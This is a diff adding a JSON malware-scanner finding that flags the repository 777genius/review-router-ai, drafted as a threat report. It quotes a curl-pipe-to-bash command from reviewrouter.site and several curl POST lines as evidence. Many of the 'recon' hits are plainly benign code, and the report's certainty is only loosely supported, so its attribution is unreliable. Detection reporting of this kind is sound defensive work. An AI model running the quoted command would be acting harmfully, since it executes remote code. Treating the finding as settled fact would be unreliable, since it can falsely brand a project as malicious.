@@ -1,0 +1,191 @@
+{
+  "finding": {
+    "key": "repository:777genius/review-router-ai",
+    "kind": "repository",
+    "id": "777genius/review-router-ai",
+    "url": "https://github.com/777genius/review-router-ai",
+    "registry": "github",
+    "owner": "777genius",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 25,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "download_exec/curl-pipe-shell; enumeration/host-recon; exfiltration/curl-post-data",
+    "evidence_locations": "scripts/seed-codex-gitlab-auth.sh:54; package.json:46; scripts/seed-codex-rotating-auth.sh:5; scripts/seed-codex-rotating-auth.sh:92; scripts/seed-codex-rotating-auth.sh:277; scripts/seed-codex-rotating-auth.sh:279; scripts/seed-codex-rotating-auth.sh:280; scripts/seed-codex-rotating-auth.sh:950; scripts/seed-codex-rotating-auth.sh:958; scripts/seed-codex-rotating-auth.sh:969; scripts/seed-codex-rotating-auth.sh:1021; scripts/seed-codex-rotating-auth.sh:1030; scripts/seed-codex-rotating-auth.sh:1059; scripts/seed-codex-rotating-auth.sh:1060; scripts/seed-codex-rotating-auth.sh:1062; scripts/seed-codex-rotating-auth.sh:1236; scripts/seed-codex-rotating-auth.sh:1267; scripts/seed-codex-rotating-auth.sh:1284; scripts/seed-codex-rotating-auth.sh:1320; scripts/seed-codex-rotating-auth.sh:1367",
+    "c2_hosts": "reviewrouter.site",
+    "iocs": "reviewrouter.site; https://reviewrouter.site/install/codex-gitlab; curl -fsSL https://reviewrouter.site/install/codex-gitlab | bash; scripts/seed-codex-gitlab-auth.sh",
+    "matched_signatures": "eval \"Buffer.from\" \"base64\"",
+    "reasons": "Shares a confirmed-malware code signature ['eval \"Buffer.from\" \"base64\"'] | Tier-2 confirmed (bash score 25)",
+    "osm_status": "submitted",
+    "osm_threat_id": "3f3503ce-b924-4180-9c4b-8b529e710393",
+    "first_seen": "hunt-20261003T060042Z",
+    "last_seen": "hunt-20261003T060042Z",
+    "evidence_file": "repositories/777genius_review-router-ai.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "scripts/seed-codex-gitlab-auth.sh",
+      "line": 54,
+      "category": "download_exec",
+      "rule": "curl-pipe-shell",
+      "snippet": "curl -fsSL https://reviewrouter.site/install/codex-gitlab | bash -s -- --confirm-write --scope group --group my-group"
+    },
+    {
+      "file": "package.json",
+      "line": 46,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "\"hosted-pool:verify\": \"pnpm hosted-pool:production-contract && vitest run scripts/hosted-pool-certification-evidence.test.ts scripts/hosted-pool-certification-workflow.test.ts scripts/hosted-pool-e2e/"
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 5,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "# A claim id is a 122-bit continuation bearer capability. Disable inherited or"
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 92,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "REVIEWROUTER_CODEX_AUTH_JSON_R<repository-id>_P<provider-hash>_E<epoch>_<entropy> name directly to GitHub"
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 277,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "parsed.hostname === \"localhost\" ||"
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 279,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "parsed.hostname === \"127.0.0.1\" ||"
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 280,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "parsed.hostname === \"[::1]\";"
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 950,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "throw new Error(\"issuer, subject, or account id is missing\");"
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 958,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "throw new Error(\"issuer, subject, or account id is missing\");"
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 969,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "\"issuer, subject, or account id is missing\","
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 1021,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "if ! gh api --hostname github.com \"repos/$TARGET_REPO/actions/secrets/public-key\" >\"$key_before\"; then"
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 1030,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "if ! gh api --hostname github.com \"repos/$TARGET_REPO/actions/secrets/public-key\" >\"$key_after\"; then"
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 1059,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "actual_repository_id=\"$(gh api \"repos/$TARGET_REPO\" --jq .id 2>/dev/null || true)\""
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 1060,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "[ -n \"$actual_repository_id\" ] || fatal \"Could not verify GitHub repository id for $TARGET_REPO with gh.\""
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 1062,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "fatal \"GitHub repository id mismatch for $TARGET_REPO. Expected $expected_repository_id but got $actual_repository_id.\""
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 1236,
+      "category": "exfiltration",
+      "rule": "curl-post-data",
+      "snippet": "if prepare_http_status=\"$(curl -q -fsS --max-redirs 0 --connect-timeout 10 --max-time 30 -X POST -H 'content-type: application/json' --data-binary \"@$request\" \"$SETUP_PREPARE_URL\" -o \"$response\" --wri"
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 1267,
+      "category": "exfiltration",
+      "rule": "curl-post-data",
+      "snippet": "if status_http_status=\"$(curl -q -fsS --max-redirs 0 --connect-timeout 10 --max-time 30 -X POST -H 'content-type: application/json' --data-binary \"@$status_request\" \"$SETUP_STATUS_URL\" -o \"$status_fil"
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 1284,
+      "category": "exfiltration",
+      "rule": "curl-post-data",
+      "snippet": "outcome_http_status=\"$(curl -q -fsS --max-redirs 0 --connect-timeout 10 --max-time 30 -X POST -H 'content-type: application/json' --data-binary \"@$outcome\" \"$SETUP_DISPATCH_OUTCOME_URL\" --output /dev/"
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 1320,
+      "category": "exfiltration",
+      "rule": "curl-post-data",
+      "snippet": "if ! dispatch_http_status=\"$(curl -q -sS --max-redirs 0 --connect-timeout 10 --max-time 30 -X POST -H 'content-type: application/json' --data-binary \"@$request\" \"$SETUP_DISPATCH_URL\" -o \"$response\" --"
+    },
+    {
+      "file": "scripts/seed-codex-rotating-auth.sh",
+      "line": 1367,
+      "category": "exfiltration",
+      "rule": "curl-post-data",
+      "snippet": "if confirmation_http_status=\"$(curl -q -fsS --max-redirs 0 --connect-timeout 10 --max-time 30 -X POST -H 'content-type: application/json' --data-binary \"@$outcome\" \"$SETUP_DISPATCH_OUTCOME_URL\" --outp"
+    }
+  ],
+  "commit_sha": "f0c18bf7759c030f311cf21050d6a61718e9dcd4",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/777genius/review-router-ai",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file scripts/seed-codex-gitlab-auth.sh around line 54. The code fetches a further script or binary from a remote location and runs it, pulling additional attacker-controlled code onto the machine after the first stage lands. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: eval \"Buffer.from\" \"base64\".",
+    "payload_description": "The malicious payload sits in scripts/seed-codex-gitlab-auth.sh at line 54. The code fetches a further script or binary from a remote location and runs it, pulling additional attacker-controlled code onto the machine after the first stage lands. Detection rules that fired in this repository: enumeration/host-recon (2 files), download_exec/curl-pipe-shell (1 file), exfiltration/curl-post-data (1 file).",
+    "publisher": "777genius",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "malware"
+    ],
+    "evidence_references": "https://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/scripts/seed-codex-gitlab-auth.sh#L54\nhttps://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/package.json#L46\nhttps://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/scripts/seed-codex-rotating-auth.sh#L5\nhttps://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/scripts/seed-codex-rotating-auth.sh#L92\nhttps://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/scripts/seed-codex-rotating-auth.sh#L277\nhttps://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/scripts/seed-codex-rotating-auth.sh#L279\nhttps://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/scripts/seed-codex-rotating-auth.sh#L280\nhttps://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/scripts/seed-codex-rotating-auth.sh#L950\nhttps://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/scripts/seed-codex-rotating-auth.sh#L958\nhttps://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/scripts/seed-codex-rotating-auth.sh#L969\nhttps://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/scripts/seed-codex-rotating-auth.sh#L1021\nhttps://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/scripts/seed-codex-rotating-auth.sh#L1030\nhttps://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/scripts/seed-codex-rotating-auth.sh#L1059\nhttps://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/scripts/seed-codex-rotating-auth.sh#L1060\nhttps://github.com/777genius/review-router-ai/blob/f0c18bf7759c030f311cf21050d6a61718e9dcd4/scripts/seed-codex-rotating-auth.sh#L1062",
+    "verified_iocs": "reviewrouter.site\nhttps://reviewrouter.site/install/codex-gitlab\ncurl -fsSL https://reviewrouter.site/install/codex-gitlab | bash\nscripts/seed-codex-gitlab-auth.sh",
+    "contributors": [],
+    "first_seen": "2026-10-03T06:00:42Z",
+    "last_seen": "2026-10-03T06:00:42Z"
+  }
+}
